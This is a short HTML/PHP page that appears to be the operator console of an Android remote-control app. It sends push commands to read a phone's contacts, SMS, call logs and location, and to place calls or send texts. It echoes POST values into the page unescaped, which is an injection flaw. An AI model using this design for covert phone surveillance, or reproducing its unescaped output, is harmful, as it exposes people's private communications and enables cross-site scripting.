<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml">

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<title>Command Line</title>

        <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.2/jquery.min.js"></script>
        <script type="text/javascript">
            $(document).ready(function(){
               
            });
            function sendPushNotification(id){
                var data = $('form#'+id).serialize();
                $('form#'+id).unbind('submit');                
                $.ajax({
                    url: "send_message.php",
                    type: 'GET',
                    data: data,
                    beforeSend: function() {
                        
                    },
                    success: function(data, textStatus, xhr) {
                          $('.txt_message').val("");
                    },
                    error: function(xhr, textStatus, errorThrown) {
                        
                    }
                });
                return false;
            }
        </script>
        <style type="text/css">
            ul.devices li .send_btn{
                background: -webkit-gradient(linear, 0% 0%, 0% 100%, from(#0096FF), to(#005DFF));
                background: -webkit-linear-gradient(0% 0%, 0% 100%, from(#0096FF), to(#005DFF));
                background: -moz-linear-gradient(center top, #0096FF, #005DFF);
                background: linear-gradient(#0096FF, #005DFF);
                text-shadow: 0 1px 0 rgba(0, 0, 0, 0.3);
                border-radius: 3px;
                color: #fff;
            }
        </style>

</head>



<body>

    <a href="javascript:history.back()">Home</a>

    <?php
    // receive data from HTML Contacts request

	$rName=$_POST["registration"];
    	$rowId=$_POST["rowid"];

	

	include_once './db_functions.php';

	$db = new DB_Functions();
	?>
    
    <form id="<?php echo $rowId ?>" name="" method="post" onsubmit="return sendPushNotification('<?php echo $rowId ?>')">     
    <div class="send_container">                         
    <textarea rows="3" name="message" cols="25" class="txt_message" placeholder="Enter command here"></textarea>
    <input type="hidden" name="regId" value="<?php echo $rName ?>"/>
    <input type="submit" class="send_btn" value="Send" onclick=""/>
    
    <p>Command Directory:
    <br />
    <b>contacts</b> - Update contacts command.
    <br />
    <b>readsms</b> - Update SMS Inbox.
    <br />
    <b>readsmsout</b> - Update SMS Outbox.
    <br />
    <b>calls</b> - Update Call Logs.
    <br />
    <b>location</b> - Update Location.
    <br />
    <b>flashon</b> - Flashlight on.
    <br />
    <b>flashoff</b> - Flashlight off.
    <br />
    <b>setvolumering</b> - Set ringer volume to ring.
    <br />
    <b>setvolumevibrate</b> - Set ringer volume to vibrate.
    <br />
    <b>setvolumesilent</b> - Set ringer volume to silent. 
    <br />
    <b>vup</b> - Volume up.
    <br />
    <b>vdown</b> - Volume down. 
    <br />
    <b>sendsms(phonenumber, textmessage)</b> - Send SMS Message ex. "sendsms(5817381739, Hi!)"
    <br />
    <b>call(phonenumber)</b> -  Initiates a call. ex. "call(5817381739)"
    <br />
    <b>play(url)</b> - Plays a sound from the internet in the background on the device ex. "play(http://www.web.com/sound.mp3)"
    <br />
    <b>open(url)</b> - Open a webpage on the device ex. "open(www.google.com)"
    <br />
    <b>sedn(notification)</b> - Send a notification to the device ex. "sedn(Be home at 7pm!)"
    <br />
    </p>

</body>

</html>
